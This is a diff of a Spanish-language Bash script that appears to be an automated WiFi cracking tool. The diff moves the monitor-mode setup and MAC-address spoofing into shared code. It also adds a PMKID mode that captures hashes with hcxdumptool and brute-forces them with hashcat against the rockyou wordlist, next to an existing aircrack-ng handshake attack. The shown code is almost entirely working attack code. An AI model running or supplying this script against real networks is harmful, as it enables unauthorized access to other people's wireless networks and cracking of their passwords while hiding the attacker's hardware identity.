@@ -58,18 +58,18 @@ function dependecies(){
 }
 
 function startAttack(){
+    echo -e "${yellowColor}[!]${endColor} ${grayColor}Configurando tarjeta de red en modo monitor${endColor}"
+    airmon-ng check kill
+    airmon-ng start $network_card > /dev/null 2>&1
+    ifconfig ${network_card}mon down && macchanger -a ${network_card}mon > /dev/null 2>&1
+    ifconfig ${network_card}mon up
+
+    killall dhclient wpa_supplicant 2> /dev/null
+
+    new_mac=$(macchanger -s ${network_card}mon | grep -i 'current' | xargs | cut -d  ' ' -f '3-10')
+    echo -e "${yellowColor}[i]${endColor} ${grayColor}Nueva direccion MAC asignada${endColor} ${purpleColor}(${endColor} ${blueColor}$new_mac${endColor} ${purpleColor})${endColor}"
+
     if [ "$(echo $attack_mode)" == "Handshake" ]; then
-        echo -e "${yellowColor}[!]${endColor} ${grayColor}Configurando tarjeta de red en modo monitor${endColor}"
-        airmon-ng check kill
-        airmon-ng start $network_card > /dev/null 2>&1
-        ifconfig ${network_card}mon down && macchanger -a ${network_card}mon > /dev/null 2>&1
-        ifconfig ${network_card}mon up
-
-        killall dhclient wpa_supplicant 2> /dev/null
-
-        new_mac=$(macchanger -s ${network_card}mon | grep -i 'current' | xargs | cut -d  ' ' -f '3-10')
-        echo -e "${yellowColor}[i]${endColor} ${grayColor}Nueva direccion MAC asignada${endColor} ${purpleColor}(${endColor} ${blueColor}$new_mac${endColor} ${purpleColor})${endColor}"
-
         xterm -hold -e "airodump-ng ${network_card}mon" & # Abre un nuevo terminal en segundo plano.
         airodump_xterm_PID=$! # Obtiene el PID de la terminal en segundo plano.
 
@@ -89,6 +89,25 @@ function startAttack(){
         wait $airodump_fliter_xterm_PID 2> /dev/null
 
         xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
+    elif [ "$(echo $attack_mode)" == "PKMID" ]; then 
+        timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status=1 -o Captura"
+        echo -e "${yellowColor}[i]${endColor} ${grayColor}Obteniedo Hashes...${endColor}\n"
+        hcxpcaptool -z myHashes Captura; rm Captura 2> /dev/null
+
+        test -f myHashes
+
+        if [ "$(echo $?)" == "0" ]; then
+            echo -e "${yellowColor}[i]${endColor} ${grayColor}Iniciando ataque por fuerza bruta...${endColor}\n"
+            sleep 2
+            hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+        else
+            echo -e "${redColor}[i]${endColor} ${grayColor}No se encontro ningun Hash...${endColor}\n"
+            rm Captura* 2> /dev/null
+            sleep 2
+        fi
+
+    else
+        echo -e "${redColor}[!] Modo de ataque no valido.${endColor}\n"
     fi
 }
 
